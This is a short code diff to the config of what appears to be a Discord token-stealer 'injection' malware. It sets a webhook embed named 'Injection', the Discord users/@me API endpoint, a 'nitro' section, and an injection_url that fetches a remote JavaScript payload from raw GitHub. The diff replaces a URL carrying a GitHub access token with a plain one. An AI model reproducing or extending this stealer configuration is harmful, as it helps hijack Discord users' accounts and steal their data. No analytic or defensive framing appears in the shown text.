@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Injection', 
   embed_icon: 'https://discord.com/assets/999edf6459b7dacdcadf.png?size=1024&format=webp&quality=lossless&width=0&height=256', 
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/1-Flower-1/test1/main/injection-clean2.js?token=GHSAT0AAAAAACW2ZGDYHGETWTP6TU66FCXAZWTFG2A', 
+  injection_url: 'https://raw.githubusercontent.com/1-Flower-1/test1/main/injection-clean.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
